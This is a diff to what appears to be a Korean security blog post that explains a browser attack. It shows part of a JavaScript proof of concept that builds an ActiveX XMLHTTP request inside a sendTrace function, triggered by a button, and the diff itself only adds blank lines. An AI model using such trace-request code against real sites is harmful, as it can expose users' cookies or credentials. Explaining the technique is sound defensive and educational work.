@@ -36,6 +36,7 @@ author_profile: false
 ## 공격 POC Code
 
 ```Javascript
+
 <script type="text/javascript">
     function sendTrace () {
 	var xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
@@ -46,6 +47,7 @@ author_profile: false
     }
 </script>
 <INPUT TYPE=BUTTON OnClick="sendTrace();" VALUE="Send Trace Request">
+
 ```
 
 위 코드는 주로 사용되는 XMLHTTP를 이용한 AJAX요청을 보내는 POC 코드이다.
